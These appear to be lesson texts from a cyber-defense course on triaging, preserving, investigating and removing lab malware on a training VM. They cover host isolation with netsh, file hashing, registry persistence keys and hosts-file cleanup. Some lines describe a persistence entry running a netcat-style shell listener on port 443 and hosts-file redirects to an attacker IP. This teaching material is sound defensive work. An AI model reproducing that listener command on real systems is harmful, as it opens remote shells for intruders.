### CDAH-M21L1-Limit the Spread of Malicious Activity ###

Triage and Malware Analysis
An incident occurs. The adversary successfully infects the network and a host with malware. For cyber defenders, the next step is to navigate the aftermath through a triage process. The triage process involves identifying and confirming the cause of the incident and isolating hosts or devices infected by malware to prevent spreading. Malware analysis may occur during or after the triage process and may be conducted through a static or dynamic method.

﻿

Analysis Goals 
﻿

Malware analysis is the process of studying or examining a suspicious file or program to determine its functionality. Malware analysis attempts to answer the six primary questions displayed in Figure 21.1-1, below.

﻿
![image](https://github.com/user-attachments/assets/b58346f4-b4f9-450a-b8a7-fdbdab4b3d53)


Analysis Methods


Different methods are necessary to analyze the different types of malware available. Static analysis is suitable for situations where a dynamic analysis may not be feasible. Defenders also have the option to combine these two methods for a more robust analysis.


Static Analysis 


Static analysis of malware is the primary method used when the suspected malware cannot be safely executed in the environment. Static analysis involves examining a file or program to discover malicious content. Static analysis does not run the malware's code during the analysis. This type of analysis identifies Indicators of Compromise (IOC) and Tactics, Techniques, and Procedures (TTP) such as file names, Internet Protocol (IP) addresses, and domains.


Dynamic Analysis 


Dynamic analysis uses a closed environment, or sandbox, to run the malicious file or program. Dynamic analysis involves examining a file or program through execution to discover malicious content. 


Combined Analysis


It is also possible to combine the static and dynamic methods during malware analysis. Defenders combine methods by conducting the analysis in a sandbox environment. The analysis employs static analysis to search for and confirm IOCs while using dynamic analysis to execute a file or program.


Figure 21.1-2, below, highlights the key features of each type of analysis.

![image](https://github.com/user-attachments/assets/f661b049-66bc-49ed-ab81-fb544b8f2754)



---------------

Initial Examination
An initial examination initiates the malware analysis and triage process. The primary goal at this stage is to limit the spread of malware as quickly as possible. Rather than conducting a deep investigation into the incident, defenders focus on learning only what is necessary to carry out immediate action. During this examination, defenders attempt to validate an infection by collecting and analyzing known malicious activity. Any IOCs and known information is used to investigate hosts and confirm the malicious activity.  

﻿

Execute an Initial Examination 
﻿

Read the scenario below, then complete the lab steps in the Virtual Machine (VM) ls-wkstn-3. Find the answers to the upcoming series of questions to complete an initial examination of an infected host. 

﻿

Scenario 
﻿

Security analysts identified a malware infecting hosts within the organization. The Cyber Protection Team (CPT) is investigating a host, which they suspect was the target of the infection. The malware varies in name, but is frequently seen using hidden folders and the registry to maintain persistence. Table 21.1-1, below, presents the specific TTPs associated with the malware:

﻿
![image](https://github.com/user-attachments/assets/ac9de2e7-09f6-4666-aa01-5028acf4729f)




Using the information above, access and conduct an initial examination to provide an overview of malware on the host ls-wkstn-3. Use static analysis for any malware detected on the host. Any additional execution of the malware may spread and worsen the infection. 


Workflow


1. Log in to the VM ls-wkstn-3 using the following credentials:
Username: trainee
Password: CyberTraining1! 



2. Search for hidden files in each user's Documents folder by navigating to the following path:
C:\Users



3. Answer the next set of questions to start the initial examination.
dir /a:h
![image](https://github.com/user-attachments/assets/59a3991d-ae45-49b4-a224-30f77a4c32a0)
![image](https://github.com/user-attachments/assets/d0fd6de6-6644-4b36-b45d-e72025bbe3e5)
![image](https://github.com/user-attachments/assets/b950de8d-adb2-42c2-8171-f1172b1774f1)

------------------

Malware on the Host
The host ls-wkstn-3 is infected with the malware ShadySocket, which was hidden in the directory C:\Users\Public\Public Documents. The functionality and purpose of the malware is unclear. Often, hidden files are an easy tactic adversaries employ to avoid detection and keep the malware on the target host. Adversaries also attempt to maintain persistence on the host with additional TTPs. For example, the registry may be used to execute a program at host startup to ensure the program is running whenever the host is powered on. 

﻿

Explore Additional TTPs During an Initial Examination
﻿

Proceed with the examination by investigating the registry of host ls-wkstn-3.

﻿

Workflow
﻿

1. Search for suspicious entries pointing to the directory C:\Users\Public\Public Documents and the file ShadySocket.exe. 

﻿

2. Answer the next set of questions to continue the initial examination.


![image](https://github.com/user-attachments/assets/27080132-7d19-419b-88dc-5a4cb14c1fd1)


![image](https://github.com/user-attachments/assets/0fcdc918-e40f-47f5-8b5b-f48f5fbad677)

reg query HKLM /f "YourString" /s

![image](https://github.com/user-attachments/assets/6ea9168c-61ff-45b6-8c84-6ae56f54b088)


![image](https://github.com/user-attachments/assets/aafb0944-ae9f-4c68-ba5a-aeaafa4fd845)



-------------------------



Persistence on the Host
﻿

The registry for ls-wkstn-3 has a value for the malware ShadySocket located on the path HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. The malware has a registry item named SecurityForMe, which points to the path of the file ShadySocket.exe. The registry item attempts to start the malware upon host startup to maintain persistence. 


﻿------------------------

 
Initial Examination Summary
﻿

The CPT discovered and provided an overview of the malware ShadySocket by conducting an initial examination on host ls-wkstn-3. ShadySocket infected the host and is hidden in the folder C:\Users\Public\Documents. Additionally, the malware created a new registry entry aimed at persistence. The registry entry directed the host to start ShadySocket.exe at startup.

﻿

This concludes the initial examination of malware on the host ls-wkstn-3.

-----------------


Mitigation
Mitigation strategies to limit the spread of malware vary based on the organization's environment, the size of the infection, and the functionality of the malware. Common approaches to mitigation involve removing host connectivity and powering down the host. These mitigation strategies only occur after all required evidence is gathered, this includes the collection of images of the host's hard drive and volatile memory.

﻿

Removing Host Connectivity
﻿

When host defenders discover malware, their first priority is to remove all communications between the infected host and the network. This prevents the malware from doing the following:

Communicating with other hosts or devices in the network.
Communicating with an adversary's external network or environment.
Spreading the infection.
Defenders can easily remove connectivity by either physically unplugging network cables from the host or by accessing the Command Line Interface (CLI) of the host and disabling network interfaces. Removing host connectivity allows defenders to continue the investigation and analysis processes. However, disabling networking interfaces is only feasible when accessing the infected host directly on the console. If the defender is accessing the host remotely, shutting down network interfaces will sever the defender's access to the system.

﻿

Powering Down Host
﻿

Powering down a host after discovering it has malware is an effective precaution when little to no information is known about the malware on the host. Defenders power down the hosts to achieve the following:

Ensure the malware is inactive.
Gain time to plan an approach for mitigation and investigation.
Mitigate any existing malware damage to the host.
Despite its advantages, powering down an infected system also prevents defenders from collecting volatile memory data that may be helpful for an investigation. Additionally, powering down the host often does not remove or permanently deactivate the malware. When the host is powered on again, the malware may continue functioning and carrying out the adversary's campaign. Powering down the host also delays ongoing dynamic investigation of malware on that system until the host can be imaged or safely powered on again, in a controlled manner.


-----------


Limit Malware Spread
Continue working in ls-wkstn-3, which is infected with the malware ShadySocket. Limit the spread of the malware by using the host's CLI to list and shutdown network interfaces. Confirm the host no longer has connectivity with any network. 

﻿

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Right-click Windows Start on the toolbar and select Command Prompt (Admin).

﻿

3. Select Yes in the dialog box that displays the prompt Do you want to allow this app to make changes to your device? 

﻿

4. View network interfaces on the host by entering the following command:

netsh interface show interface        
﻿

The Microsoft CLI utility netsh allows users to display or modify host network configurations. The command netsh interface show interface returns the network interfaces and their statuses on the host. 

﻿

5. Disable the interface Ethernet1 by entering the following command:

netsh interface set interface Ethernet1 disable
﻿

6. Disable the interface Ethernet0 by entering the following command:

netsh interface set interface Ethernet0 disable
﻿

7. Answer the next question to confirm steps 5 and 6 have been completed successfully.


![image](https://github.com/user-attachments/assets/7dfdf4a8-3d0e-48f1-85d8-5419f2b0e5ee)

![image](https://github.com/user-attachments/assets/4cd281f6-ad9c-4551-9b01-b0a220a290fe)


------------------


Successful Prevention and Migration
Listing the network interfaces after completing the previous lab outputs the following:


Admin State    State          Type             Interface Name
-------------------------------------------------------------
Disabled       Disconnected   Dedicated        Ethernet1
Disabled       Disconnected   Dedicated        Ethernet0
﻿

The output confirms the interfaces have been disabled successfully. The Admin State for both interfaces Ethernet1 and Ethernet0 are listed as Disabled. The State for both interfaces is listed as Disconnected. This indicates that all connectivity on the host has been removed, which prevents the malware from spreading.

![image](https://github.com/user-attachments/assets/6577b7dc-2bf6-4f90-bf11-71eeae1392c6)
![image](https://github.com/user-attachments/assets/26bbb58c-147c-450b-9ada-d2d967d74b62)


-------------------


### CDAH-M21L2-Preserve Malicious Artifacts ### 

Preserving Malware Artifacts
Malware has been discovered on a host within the network. The triage process has successfully contained the spread and ensured that all critical information and hosts are not compromised. The next step in the triage process is preservation. Malware preservation begins with identification of the malware itself and artifacts related to it. Malware artifacts include items located in files, directories, scripts, browser history items, scheduled tasks, and even the malicious software. Given their broad and inclusive nature, malware artifacts can be located anywhere on the host, requiring a keen eye and investigative mindset to accurately identify. Preservation may include more investigation, as the initial goal of triage is solely to stop the spread and mitigate damage, meaning more artifacts may persist on the host. 


---------------------


Discover Malware Artifacts
In the following lab, use the provided scenario to analyze an infected host and discover malware artifacts. 

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been tasked with investigating hosts that have been infected by the ShadySockets malware. Triage of the ls-wkstn-3 host uncovered the following Indicators of Compromise (IOC):


![image](https://github.com/user-attachments/assets/4d5fdb09-82fc-4512-82e3-7f265d885750)


The triage process was completed quickly to stop the spread of the malware and mitigate damage to the host. Because the work was so rapidly done, more artifacts as a result of ShadySockets may persist on the host. 


Using the information above, access and analyze the infected ls-wkstn-3 host to discover malware artifacts.


Workflow


1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Review hidden files located in C:\Users\Public\Documents to confirm that the ShadySockets.exe malware exists on the host. Once the existence of the malicious executable is confirmed, review and analyze the rest of the C:\Users\Public directory.   


Use this workflow to answer the following questions.


![image](https://github.com/user-attachments/assets/dec3a31a-c30d-4f45-8ee3-f8e75990fe10)


![image](https://github.com/user-attachments/assets/f13f419d-db62-4d4e-983b-6b55e6de9719)


![image](https://github.com/user-attachments/assets/2a60d938-e56a-41c9-bd31-eebd1b2779aa)


----------------------

Context for Discovered Artifacts
Figure 21.2-1 shows the hidden and nonhidden files in the C:\Users\Public\Downloads directory:


![image](https://github.com/user-attachments/assets/d6f88a2d-0433-4ab7-86a8-cda6a1805fdf)


NOTE: By default, the file path shown in the address bar is the display name of the directory rather than its underlying directory path.


The nonhidden file, document.pdf, can potentially point to the initial cause of the infection. In this scenario, the document.pdf file is a malicious document. The user downloaded the document.pdf file from what they thought was a trusted source, and when the file was opened, it initiated malicious downloads and modifications to the host. The downloads and modifications are programmed to occur in the background, hidden and unknown to the user. 


Of the downloaded hidden files, Nmap and nmap-7.92-setup are aimed at conducting active reconnaissance on the network. The adversary may strategically place these on the victim host in an effort to identify other hosts and devices on the network and expand use of the malware and the campaign. The Enable-RDP file is a Windows PowerShell script, likely to enable Remote Desktop Protocol (RDP) on victim hosts that the adversary has infected with the malware. 


-------------------

Investigate Task Scheduler
Often, such scripts as Enable-RDP that are planted on the victim host are leveraged to enable settings or access critical information that provide functionality and payload to the adversary. Scripts automate otherwise tedious tasks and processes and can be scheduled to run outside the view of the user. For this reason, Task Scheduler must be investigated.

﻿

In Windows, Task Scheduler allows users to automatically perform routine tasks on a chosen computer. Task Scheduler monitors user-defined triggers, and when a trigger is activated, the user-defined tasks, or actions, are then completed on the host. Task Scheduler allows the actions to occur hidden, away from view of the user, making it an attractive application for the adversary to leverage.

﻿

Complete the steps in the following workflow to investigate Task Scheduler.

﻿

Workflow
﻿

1. Right-click the Windows icon located on the taskbar, select Control Panel, select Administrative Tools, and select Task Scheduler.

﻿

2. In the left pane of Task Scheduler, under Task Scheduler (Local), select Task Scheduler Library.

﻿

3. In the Task Scheduler Library, review the scheduler tasks, and look for actions that call for execution of the Enable-RDP script. 

﻿

Use this workflow to answer the following questions.


![image](https://github.com/user-attachments/assets/5e732e2b-579c-44cc-8579-94e3379fac7d)


![image](https://github.com/user-attachments/assets/65011985-16a9-451d-84c1-e07e3ce4b923)


![image](https://github.com/user-attachments/assets/bfbbd66b-9526-4520-8be4-d3ba5625973d)


-----------------

Artifacts Discovered
Through investigation and analysis of files and directories on the ls-wkstn-3 host, the CPT discovered and provided artifacts related to the ShadySockets malware. ShadySockets has infected the host, and related artifacts were found in the C:\Users\Public\Downloads folder. The artifacts included an application installation of the Nmap software, an exfiltration folder, a suspicious Portable Document Format (PDF) file, and a Windows PowerShell script. Additionally, the malware created a scheduled task, RDP, to ensure RDP was enabled on the host. These artifacts continue in the preservation process and require further analysis later in the investigation. 


-------------


Handling Malware Artifacts
Evidence is key to a criminal investigation, providing critical answers to the questions Who? What? When? Where? Why? and How? Cybersecurity evidence is no different from criminal evidence in this regard. Cybersecurity evidence holds vital information that must be preserved. Changes may alter the behavior of the malware, artifacts, or evidence that already exists on the host, compromising portions of the investigation. To handle malware evidence appropriately, Cyber Defense Analysts (CDA) must minimize making changes to the victim host. Although some changes are necessary to mitigate damage, such as removing network connectivity, limiting the amount of changes to the bare minimum is a priority.  

﻿

Evidence Integrity
﻿

Evidence integrity is the protection of evidence material from alteration, contamination, or deletion. Malware evidence can be easily tampered with or modified, and maintaining the integrity of the evidence is a critical task. Techniques and tools used must be aimed at accurately and efficiently collecting and storing evidence. 

﻿

One technique often used in a cybersecurity investigation is the collection of a forensic image. A forensic image is a direct copy of the host’s physical storage device, such as the Hard Disk Drive (HDD). A forensic image contains all files, directories, and space allocations (illustrated in Figure 21.2-2). In an ideal scenario, all investigative actions would occur on the forensic image rather than on the directory on the victim host. Using a forensic image achieves the goal of handling a malware-infected host, as CDAs are not changing or making direct contact with the host.


![image](https://github.com/user-attachments/assets/4213b04c-da2f-4306-90ba-1492a1fa66db)


Sometimes an investigation may require CDAs to complete tasks and actions directly on the victim host. Should work directly on the host be required, documentation of all activities through the use of Operation Notes (OPNOTES) is top priority. After completing significant tasks such as memory capture, endpoint analysis, or malware remediation, Forensic images should be created frequently, after such major tasks or actions as memory capture, malware remediation, or endpoint analysis are completed.


![image](https://github.com/user-attachments/assets/cb864b49-1f4e-4ee1-bff0-686f182c854d)



-----------------



Extracting Malware Artifacts
Extracting malware artifacts includes copying artifacts from the host machine for further investigation. Accurately extracting malware relies on deliberate actions and documentation. Any actions taken must be recorded so that the investigation is not confused with the injection. Methods of extraction have two goals: to accurately extract malicious artifacts and to preserve the organization’s OPSEC, meaning the sensitive information is not compromised in any way.


---------------


Hash Malware Artifacts
A hash algorithm provides a unique, fixed-length string for a piece of data or file. Hashing refers to the application of the hash algorithm to a file or folder at a given point in time. The output of hashing a file or folder, an alphanumeric string referred to as a hash value, is unique to the file or folder. If a file or folder is hashed again in the future and the new hash value is different from the original hash value, changes have occurred in the file or folder. Hashing a file or folder is an effective method to extract malicious samples in a manner that preserves OPSEC. The hash algorithm relies on a complex equation to derive the hash’s value. Numerous algorithms exist, such as Message Direct 5 (MD5) and Secure Hash Algorithm (SHA). Each algorithm is different; however, the overall goal is the same: to produce a hash value that maintains the integrity and security of the artifact. 

﻿

Windows PowerShell is a common tool for quickly and effectively hashing a file, using the Get-FileHash cmdlet. Get-FileHash by default uses the SHA256 algorithm, but it can be changed and defined by the user.

﻿

The following lab involves hashing ShadySockets malware artifacts. The ShadySockets malware was found on host ls-wkstn-3. The CPT collected an image of the infected host.

﻿

Hash Malware Artifacts | Part 1
﻿

Complete the steps in the following workflow to access the copy of the ls-wkstn-3 host infected with the ShadySockets malware and hash previously identified malware artifacts. 

﻿

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Access a new Windows PowerShell terminal.

﻿

3. Within the terminal, navigate to C:\Users\Public\Downloads.

﻿

4. To view the nonhidden files contained in the C:\Users\Public\Downloads folder, run the following cmdlet:


ls
﻿

5. To view the hidden files contained in the C:\Users\Public\Downloads folder, run the following cmdlet:


ls -hidden
﻿

-hidden following the ls command ensures that all hidden files are displayed. 

﻿

6. Run the following cmdlet:


Get-FileHash .\document.pdf
﻿

Figure 21.2-3 displays the output returned from the cmdlet:

![image](https://github.com/user-attachments/assets/e0970d46-09bd-4ace-8841-578d26f886b8)

The hash is the result of the SHA256 algorithm for the document.pdf file. 


7. Run the following cmdlet:

Get-FileHash .\document.pdf -Algorithm MD5



Figure 21.2-4 displays the output returned from the cmdlet:

![image](https://github.com/user-attachments/assets/791c2603-818d-4353-aaad-b380189c74c1)



Using -Algorithm, users can define the hashing algorithm. Figure 21.2-4 shows the use of the MD5 hash for the document.pdf file.  


If the document.pdf file is manipulated or changed, the hash value is different from what is currently listed in Figure 21.2-3 and Figure 21.2-4. It is critical to hash all artifacts at the start of the investigative process and after any actions are taken on the host. The hash values must be recorded to preserve OPSEC and an accurate view of the investigative actions.

-------------

Hash Malware Artifacts | Part 2
Complete the steps in the following workflow to access the host infected with the ShadySockets malware and continue hashing previously identified malware artifacts. 

﻿

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Hash the following artifacts by the given algorithm in Table 21.2-2:

﻿
![image](https://github.com/user-attachments/assets/82192edb-77c0-4ab2-9cee-e2cbc6a600af)


Table 21.2-2


3. Record the hash values of the artifacts to help in responding to the questions that follow.



![image](https://github.com/user-attachments/assets/ec4d1813-0c5c-4964-be87-9189eaa0337b)


![image](https://github.com/user-attachments/assets/b9f48afb-f5d6-486a-9416-e780e5735827)


![image](https://github.com/user-attachments/assets/6e502f3a-2185-4fa5-a64c-662a1dc5ebdb)


-------------------

### CDAH-M21L3-Investigate Malicious Software ###

Malware Investigation
An organization has identified a threat or potential breach, and its incident response plan has been put into action. The top priority during the response is mitigation of the threat and prevention of any damage to the organization’s hosts and devices. An additional priority is preservation and investigation of the malware and the mechanisms used to conduct the breach. Static analysis and dynamic analysis of the malware are needed to aid in the investigation. Malware analysis provides critical information that an organization can use to assess and modify its current cybersecurity defense posture. 

﻿

Malware Analysis 
﻿

The goal of malware analysis is to research and identify malware and malware artifacts in an effort to evolve defenses and protect the organization’s network. Malware analysis must seek to answer the following questions:

What was the attack vector used for the infection? 
What is the malware’s interactive behavior, what does it do, and what does it change?
What are the static properties (such as hashes, metadata, and embedded strings) of the malware?

Malware analysis may not always provide answers to each of the questions listed; unknowns may persist. However, malware analysis should strive to answer each question using the data and information available. At the end of the analysis, IOCs and TTPs should be summarized and identified. 


------------------


Investigation
Read the following scenario: 

﻿

A Cyber Protection Team (CPT) is tasked with analyzing a malware file discovered on an infected host, ls-wkstn-3, as part of a wide-scale network breach. The malware has been identified as a potentially malicious PDF file, Financial Report Q2.pdf, located on the path C:\Users\trainee\Desktop\CorporateQ2. Additionally, security analysts have identified email as the attack vector used by the threat actor to introduce the malware to the organization’s network.

﻿

Security analysts conducted research on similar malicious documents found in the organization. Table 21.3-1 provides the TTPs and associated notes:

﻿
![image](https://github.com/user-attachments/assets/7a089eed-9a50-473f-ac17-24356ab127b7)

Using the information above as well as information provided in upcoming tasks, perform a hands-on investigation of the malware to determine the malware’s specific TTPs.


Investigation | Part 1


Complete the steps in the following workflow to perform both static and dynamic analyses on the ls-wkstn-3 host. The ls-wkstn-3 host is located in a sandbox environment. The functionality of the malware on the host is largely unknown, and although dynamic analysis is included, unusual occurrences, such as connection attempts, dialog boxes, and error messages, may occur. 


Workflow


1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Confirm the location and existence of the Financial Report Q2.pdf and FR-Q2.exe files on the path C:\Users\trainee\Desktop\CorporateQ2.


3. Conduct static analysis of the Financial Report Q2.pdf and FR-Q2.exe files.


4. Open the Financial Report Q2.pdf file. Select Open when the warning dialog appears.


5. Conduct dynamic analysis of the Financial Report Q2.pdf and FR-Q2.exe files. 


Using this workflow, answer the questions that follow.

![image](https://github.com/user-attachments/assets/6391c442-53e4-4be2-9ec1-8ddede4ddafd)

command to find hidden .exe file

C:\>dir /a /s /b "C:\*updateCheck.exe"
![image](https://github.com/user-attachments/assets/fba1ae41-1026-4498-8a19-d1f945b12b6b)
![image](https://github.com/user-attachments/assets/e4116167-e1f5-4c39-b966-3c20156d1dde)

----------------

Investigation | Part 2
The Financial Report Q2.pdf file presented additional malware artifacts to the ls-wkstn-3 host. One of the artifacts found on the host is updateCheck.exe, an executable file located on the path C:\Users\trainee\AppData\Roaming. 

﻿

The executable file’s functionality is not known.

﻿

Workflow
﻿
1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿
﻿

2. Execute the updateCheck.exe file, and analyze the actions that occur.


![image](https://github.com/user-attachments/assets/19e19d0c-7592-45d3-8599-616e398ce573)


-------------

Investigation | Part 3
The updateCheck.exe file causes a dialog box to appear on the ls-wkstn-3 host. The dialog box indicates that “cdah has stopped working.” The alert is not a usual occurrence. It is possible the malware is attempting to complete a task, connection, or action. However, the attempt is not successful.


![image](https://github.com/user-attachments/assets/f919db99-2106-4b8d-bef3-1e89773b89a7)


-----------------


Investigation | Part 4
The appearance of the “cdah has stopped working” dialog box as a result of opening the updateCheck.exe file may point to some of the malware’s functionality. It is possible that the malware attempts to connect to internal or external hosts in an attempt to either widen the infection or deliver exfiltrated data from the compromised environment. 

﻿

Persistence
﻿

To persist on the host, malware often targets the host’s registry with the creation of key items. The key items allow the malware to start itself or additional artifacts when the host powers on. Common registry locations targeted by adversaries include the following:


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

Workflow
﻿

1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿
﻿

2. Review the common registry paths for any items that point to updateCheck.exe. 

![image](https://github.com/user-attachments/assets/37033355-fee3-4b0e-91de-e277d1d74564)

![image](https://github.com/user-attachments/assets/83aca0b5-1678-4e7a-b38a-fa7971ef769e)
![image](https://github.com/user-attachments/assets/ba0341db-fb72-4d55-a070-0e2656de27fd)

----------------------


Investigation Summary
Through the use of static and dynamic analyses, the CPT discovered the following regarding malware located on the ls-wkstn-3 host: 

A malicious PDF file sent via email as an attachment, Financial Report Q2.pdf, located on the path C:\Users\trainee\Desktop\CorporateQ2.

A hidden executable file, updateCheck.exe, located on the path C:\Users\trainee\AppData\Roaming.

An attempt by updateCheck.exe to make connections; the connections fail.

An Abobe entry in the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry paths, aimed at maintaining persistence on the host. 

﻿
---------------

ATT&CK TTPs
MITRE ATT&CK® is a knowledge base of common adversarial attack TTPs used against Windows networks. Currently, the ATT&CK matrix (attached) includes 14 tactics, which cover the why (the objective for performing the action), and more than 180 techniques (with nearly 400 subtechniques), which state how the adversary is going to perform the action and what they hope to gain from it.

﻿

MITRE’s model reflects the various phases of an adversary’s attack lifecycle and the platforms they are known to target but is free from the rigidity of a linear attack chain. At a high level, the ATT&CK matrix is a behavioral model that consists of the following core components: 

Tactics: Short-term, tactical adversary goals during an attack (the columns in the ATT&CK matrix). 
Techniques: The means by which adversaries achieve tactical goals (the individual cells in the ATT&CK matrix). 
Documented adversary use of techniques and other metadata (linked to techniques): ATT&CK is not an exhaustive enumeration of attack vectors against software, but the documented operation can be used to contextualize the impact of an attack, the actors known to employ the technique, and other information.
The ATT&CK matrix can help define and associate characteristics of malware identified within hosts. Using the ATT&CK matrix, Cyber Defense Analysts (CDA) can view techniques and subtechniques that aid in further research of the malware and point to other events that may occur.  


-----------


Associate Malware with ATT&CK TTPs
During the initial investigation, the following items regarding malware were discovered: 


A malicious PDF file sent via email as an attachment, Financial Report Q2.pdf, located on the path C:\Users\trainee\Desktop\CorporateQ2.

A hidden executable file, updateCheck.exe, located on the path C:\Users\trainee\AppData\Roaming.

An attempt by updateCheck.exe to make connections; the connections fail.

An Abobe entry in the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry paths. 


Using the information in the attached ATT&CK matrix, review the malware items obtained during the initial investigation. Associate each item with ATT&CK TTPs found in the matrix.

﻿![image](https://github.com/user-attachments/assets/448a7ded-9051-4fba-9c37-358572edc86a)
![image](https://github.com/user-attachments/assets/22a9db2c-6dd9-43be-a350-7bb2f03daa2b)
![image](https://github.com/user-attachments/assets/6ff80631-bdb2-4b74-a845-b10dda77d536)
![image](https://github.com/user-attachments/assets/bf2ec6b7-2448-45dd-947f-bf077ed19c99)



---------


ATT&CK TTP Summary
Each of the items regarding malware that were discovered during initial investigation has been associated with a TTP found in the ATT&CK matrix. Table 21.3-2 provides each item, its associated TTP, and the link to the associated TTP on the ATT&CK website: 



![image](https://github.com/user-attachments/assets/5497f3c5-01e9-4202-8610-d18e3ddfe585)



----------------

### CDAH-M21L4-Neutralize Malicious Software ###

Neutralizing and Removing Malware
Modern malware is sophisticated in its functionality and ability to evade initial detection as it traverses the entry control points of a network and endpoint anti-malware systems. Organizations often configure anti-malware systems to stop scanning analysis after a file has crossed the control point and is successfully in the environment. Organizations commonly do not employ constant monitoring of files and applications already accepted in the environment in favor of system performance and resource allocation. 

﻿

Once a breach has been detected, the incident response process starts. After the malware has been contained and triaged, the neutralize (clean) phase begins. The neutralize phase relies on analysts’ neutralizing threats without corrupting forensic artifacts. Tasks during this phase may include terminating malware processes, reinstalling Operating Systems (OS), or verifying malware removal, as illustrated in Figure 21.4-1. Malware complexity and organizational impact are factors that impact the decisions and strategies analysts take in this stage. 

﻿![image](https://github.com/user-attachments/assets/5de8358c-1af1-4e02-a543-6f15574a8a05)

Factors Affecting the Path for Malware Removal


Advanced malware attacks evade detection using complex techniques, such as sleep functionality, encryption, and polymorphic code, and these techniques change their identifiable features constantly. Additionally, malware can infect a system’s Unified Extensible Firmware Interface (UEFI). As a result, the malware is capable of surviving a system reboot, OS reinstallation, and a hard disk replacement. Advanced malware features can make the removal method unreliable in certain scenarios. The decision to remove malware is heavily dependent on the results from dynamic analysis in the investigative phase. 


Ideally, a system or host would be restored to an image in a known good state. Once the system or host is restored, hardening tasks would be applied to patch vulnerabilities and prevent a similar attack from occurring. Organizations must factor in the complexity of the system or hosts when deciding how to handle a malware infection. Rebuilding complex systems requires a large amount of resources, including access to the system, time, personnel, and money. In addition, the collateral damage from extended downtime to the Information Technology (IT) system and organization can be a catastrophic loss leading to mission failure.



---------------


Remove Malware
Scenario: Investigative Report
﻿

A Cyber Protection Team (CPT) investigation was previously completed, identifying suspicious internet traffic on ls-wkstn-3. ls-wkstn-3 is a host used by a financial purchasing agent that contains large amounts of financial account information and Personally Identifiable Information (PII). Hypertext Transfer Protocol Secure (HTTPS) traffic bound for geocities.com and yahoo.com was redirected to Internet Protocol (IP) address 210.210.210.2. This IP address is known to be part of the infrastructure used by the amateur threat actor group FranklinEdition. During the investigation, the CPT analysts reviewed Security Information and Event Management (SIEM) traffic and conducted host analysis. As a result, numerous pieces of information; artifacts; and Tactics, Techniques, and Procedures (TTP) were discovered, as shown in Table 21.4-1. Table 21.4-1 also contains each discovered TTP’s link to its associated technique in the MITRE ATT&CK® matrix. 


![image](https://github.com/user-attachments/assets/0749ebba-e9fe-46c7-845e-19e86a1b3873)


Clear Operation


Upon discovery of the artifacts in Table 21.4-1, a clear operation has been ordered. While clear operations are not commonly done by a CPT, the client has requested that the CPT aid in neutralizing the malicious software by removal of any remaining threat actor presence and restoring the system to a clean state. 


Remove Malware: Confirm Artifacts and Delete Persistence Mechanism


Complete the steps in the following workflow to start the operation; this includes confirming the existence of each artifact and deleting the persistence mechanism found in the registry.


Workflow


1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Access the registry and navigate to HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Abobe.


3. Right-click the Abobe entry, and select Delete. 


By de leting th e Abobe entry, which points to the updateCheck.exe -dLp 443 -e cmd.exe command, the malware’s persistence mechanism is removed. The Abobe entry ran the updateChec k.exe with a shell listening on port 443, whic h  was executed whe n t he host was powered on. 



-------------

Remove Malware: Collect Hash Values
Complete the steps in the following workflow to continue the clear operation by collecting hash values of artifacts. 

﻿

Workflow
﻿


1. Open a Windows PowerShell terminal, and navigate to C:\Windows\System32\drivers\etc.

﻿

2. Enter the following command to hash the hosts file found in C:\Windows\System32\drivers\etc:


Get-FileHash .\hosts -Algorithm MD5
﻿

3. Record the hash value. The hash value ensures that the file remains uncorrupted. 

﻿

4. Continue the same process in Steps 1 through 3 to collect hash values for the files

C:\users\trainee\appdata\roaming\Q2 financials.zip and C:\users\trainee\appdata\roaming\updateCheck.exe.

﻿

Use this workflow to answer the following questions.
![image](https://github.com/user-attachments/assets/c0824bd4-2adc-4ee3-abac-6cf76f581e61)
![image](https://github.com/user-attachments/assets/6bbf68eb-eebc-4fa5-8257-af6191102725)
![image](https://github.com/user-attachments/assets/4d2f41ae-f118-480c-a7af-8c87dfd1ac35)



-----------


Remove Malware: Remove Malware Artifacts
Complete the steps in the following workflow to continue the clear operation by accessing and removing malware artifacts. 

﻿

Workflow
﻿


1. Navigate to C:\Windows\System32\drivers\etc within File Explorer.

﻿

2. Open the hosts file in Notepad as an Administrator. 

﻿

3. Modify the hosts file by removing the following lines, found at the bottom of the file:


210.210.210.2 www.geocities.com
220.210.210.2 www.yahoo.com
﻿

4. Select File and Save to save the hosts file. 

﻿

5. Navigate to C:\users\trainee\appdata\roaming\Q2 financials.zip.

﻿

6. Delete the Q2 financials.zip folder. 

﻿

7. Navigate to C:\users\trainee\appdata\roaming\updateCheck.exe.

﻿

8. Delete the updateCheck.exe file. 

﻿

9. Right-click Recycle Bin, and select Empty Recycle Bin.

﻿

10. Return to t he paths C:\u sers\trainee\appdata\roaming\Q2 financials.zip and C:\users\trainee\appdata\roaming\updateCheck.exe, an d verify that  each folder or file  has been remov ed.


---------------------

Mitigate Threats
